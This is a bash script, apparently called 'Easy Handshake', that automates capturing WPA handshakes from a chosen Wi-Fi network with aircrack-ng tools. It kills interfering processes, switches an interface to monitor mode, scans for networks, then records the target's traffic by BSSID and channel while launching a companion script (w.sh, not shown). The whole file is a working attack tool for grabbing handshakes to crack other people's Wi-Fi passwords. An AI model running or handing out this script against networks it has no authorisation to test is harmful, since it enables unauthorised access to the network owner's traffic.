#!/bin/bash

chmod +x w.sh
chmod +x r.sh
mkdir /root/Desktop/ehandshake
touch /root/Desktop/ehandshake/temp.txt
chmod +x /root/Desktop/ehandshake/temp.txt
clear

echo " 
                       ____    __    ___  _  _     
                      ( ___)  /__\  / __)( \/ )  
                       )__)  /(__)\ \__ \ \  /     
                      (____)(__)(__)(___/ (__)   
	 
            _   _    __    _  _  ____   ___  _   _    __    _  _  ____
           ( )_( )  /__\  ( \( )(  _ \ / __)( )_( )  /__\  ( )/ )( ___)
            ) _ (  /(__)\  )  (  )(_) )\__ \ ) _ (  /(__)\  )  (  )__) 
           (_) (_)(__)(__)(_)\_)(____/ (___/(_) (_)(__)(__)(_)\_)(____)                  

                                                                       by AVISHEK
" 


iwconfig

# inputs the name of wireless interface 

echo -n "Enter the name of your wireless interface. E.g. if the name is wlan0 enter 0 :"

read ans

#kill processes

airmon-ng check kill

#airmon-ng start

if [ $ans -eq 0 ]

then

	airmon-ng start wlan0
	
	
fi

if [ $ans -eq 1 ]

then

	airmon-ng start wlan1
	
	
fi

if [ $ans -eq 2 ]

then

	airmon-ng start wlan2
	
	
fi

echo " PRESS CTRL + C AFTER YOUR TARGET IS ON SCREEN"

# airodump start

if [ $ans -eq 0 ]

then

	
	airodump-ng wlan0mon
	
fi

if [ $ans -eq 1 ]

then

	
	airodump-ng wlan1mon
	
fi

if [ $ans -eq 2 ]

then


	airodump-ng wlan2mon
	
fi

# reads details 

read -p "Enter the bssid : "  bs

echo -n "Enter the channel :"

read ch

read -p "Enter a filename :" y

echo "$y-01" > /root/Desktop/ehandshake/temp.txt

# move into new terminal

gnome-terminal -- "./w.sh" --geometry 96x24

# airodump target specific

if [ $ans -eq 0 ]

then

	
	airodump-ng --bssid $bs --channel $ch --write /root/Desktop/$y wlan0mon
	
fi

if [ $ans -eq 1 ]

then

	
	airodump-ng --bssid $bs --channel $ch -w /root/Desktop/$y wlan1mon
	
fi

if [ $ans -eq 2 ]

then


	airodump-ng --bssid $bs --channel $ch -w /root/Desktop/$y wlan2mon
	
fi
















